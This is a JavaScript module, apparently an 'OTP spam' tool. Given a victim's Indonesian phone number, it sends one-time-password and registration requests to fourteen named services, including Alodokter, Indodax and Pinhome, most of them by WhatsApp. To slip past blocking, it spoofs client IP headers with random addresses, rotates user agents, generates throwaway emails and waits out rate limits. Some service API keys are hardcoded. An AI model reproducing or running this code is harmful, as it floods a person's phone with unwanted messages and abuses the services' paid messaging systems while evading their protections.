import axios from "axios";

const CONFIG = {
  retries: 2,
  timeout: 45000,
  delayMin: 3000,
  delayMax: 5000,
};

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36",
];

function randomIp() {
  return `${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}`;
}

function randomUa() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomEmail() {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 10; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result + "@bwmyga.com";
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export function normalizePhone(phone) {
  let p = String(phone).replace(/\D/g, "");
  if (p.startsWith("0")) {
    p = "62" + p.substring(1);
  }
  if (!p.startsWith("62")) {
    p = "62" + p;
  }
  return p;
}

export function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export function getEndpoints(phone) {
  const p08 = "0" + phone.substring(2);
  const p62 = phone;
  const pNoCountry = phone.replace("62", "");
  const deviceId = String(rand(1000000000000000, 9999999999999999));
  const requestId = String(rand(1000000000000000, 9999999999999999));
  const email = randomEmail();

  return [
    {
      name: "Maulagi",
      url: "https://api.maulagi.id/api/v2/auth/check",
      json: { credentials: p62 },
      headers: { "X-ML-KEY": "B10JLPEP10" },
    },
    {
      name: "Matahari",
      url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation",
      json: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" },
    },
    {
      name: "Pinhome",
      url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp",
      json: {
        accountType: "customers",
        applicationType: "Pinhome Web",
        countryCode: "62",
        medium: "whatsapp",
        otpType: "register",
        phoneNumber: pNoCountry,
      },
    },
    {
      name: "Bonus Belanja",
      url: "https://www.bonusbelanja.com/api/auth/registration/app",
      json: {
        phone: p62,
        name: "User",
        agreeTnc: true,
        agreeContact: false,
      },
    },
    {
      name: "Alodokter",
      url: "https://www.alodokter.com/resend-otp",
      json: {
        user: {
          phone: p08,
          uuid: String(rand(10000000, 99999999)),
        },
        request_via: "whatsapp",
      },
    },
    {
      name: "Beautyhaul",
      url: "https://www.beautyhaul.com/ajax/account/send_otp",
      json: {
        method: "WhatsApp",
        phone: p62,
      },
    },
    {
      name: "Gritero",
      url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id",
      json: {
        nama_lengkap: "User",
        telepon: p08,
        email: `user${rand(1000, 9999)}@mail.com`,
      },
      headers: {
        Xid: String(rand(1000000, 9999999)),
        source: "ocistok",
      },
    },
    {
      name: "Internet Rakyat",
      url: "https://internetrakyat.id/api/app/auth/send-otp-register",
      json: {
        phone_number: p08,
      },
      headers: {
        "x-api-key": "280999!FTTH",
      },
    },
    {
      name: "Dokterin",
      url: "https://api.dokterin.id/user/v1/users/login",
      json: {
        phone: p62,
        tnc_accept: true,
        device_id: deviceId,
      },
    },
    {
      name: "Paper.id",
      url: "https://api.paper.id/api/v1/auth/login",
      json: {
        method: "whatsapp",
        phone: p08,
      },
      headers: {
        "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152",
        "request-id": requestId,
      },
    },
    {
      name: "Bunda",
      url: "https://cms.bunda.co.id/api/v1/auth/send-otp",
      json: {
        phone_number: p62,
        type: "auth",
      },
    },
    {
      name: "Fastwork",
      url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode",
      json: {
        phone_number: p08,
      },
    },
    {
      name: "Saturdays",
      url: "https://api.saturdays.com/v2/user/otp/request",
      json: {
        phoneNumber: p62,
        channel: "whatsapp",
      },
    },
    {
      name: "Indodax",
      url: "https://api.indodax.com/api/v1/otp/send",
      json: {
        email: email,
        flow: "register",
        method: "whatsapp",
        old_uuid: "",
      },
      headers: {
        key: "bAGUG2WiLy",
        authorization: "Bearer bAGUG2WiLy",
      },
    },
  ];
}

export async function sendRequest(endpoint) {
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": randomUa(),
    "X-Forwarded-For": randomIp(),
    "X-Real-IP": randomIp(),
    Accept: "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
    Connection: "keep-alive",
    ...(endpoint.headers || {}),
  };

  const url = endpoint.url;
  const isFastwork = url.toLowerCase().includes("fastwork");
  const delay = isFastwork
    ? rand(30000, 45000)
    : rand(CONFIG.delayMin, CONFIG.delayMax);

  await sleep(delay);

  for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
    try {
      const resp = await axios.post(url, endpoint.json, {
        headers,
        timeout: CONFIG.timeout,
      });

      const status = resp.status;
      if ([200, 201, 202, 204].includes(status)) {
        return { success: true, name: endpoint.name, status };
      }

      if (status === 429) {
        let retryAfter = 30;
        try {
          if (resp.data && resp.data.retry_after) {
            retryAfter = parseInt(resp.data.retry_after);
          }
        } catch {}
        await sleep(retryAfter * 1000);
        continue;
      }

      if (attempt < CONFIG.retries) {
        await sleep(rand(5000, 8000));
        continue;
      }

      return {
        success: false,
        name: endpoint.name,
        status,
        message: resp.data?.message || "Gagal",
      };
    } catch (err) {
      if (attempt < CONFIG.retries) {
        await sleep(rand(5000, 8000));
        continue;
      }
      return {
        success: false,
        name: endpoint.name,
        status: err.response?.status || 0,
        message: err.message,
      };
    }
  }

  return { success: false, name: endpoint.name, message: "Max retries" };
}

export async function spamOtp(phone, onProgress) {
  phone = normalizePhone(phone);

  if (!phone || !/^62[0-9]{10,13}$/.test(phone)) {
    return { error: "Nomor tidak valid. Format: 6281234567890" };
  }

  const endpoints = getEndpoints(phone);
  const total = endpoints.length;
  const results = [];
  const start = Date.now();

  for (let i = 0; i < endpoints.length; i++) {
    const result = await sendRequest(endpoints[i]);
    results.push(result);
    if (onProgress) {
      await onProgress(i + 1, total, result);
    }
  }

  const elapsed = (Date.now() - start) / 1000;
  const success = results.filter((r) => r.success).length;
  const failed = results.filter((r) => !r.success).length;

  return {
    success,
    failed,
    total,
    elapsed,
    results,
    failedList: results.filter((r) => !r.success),
  };
}
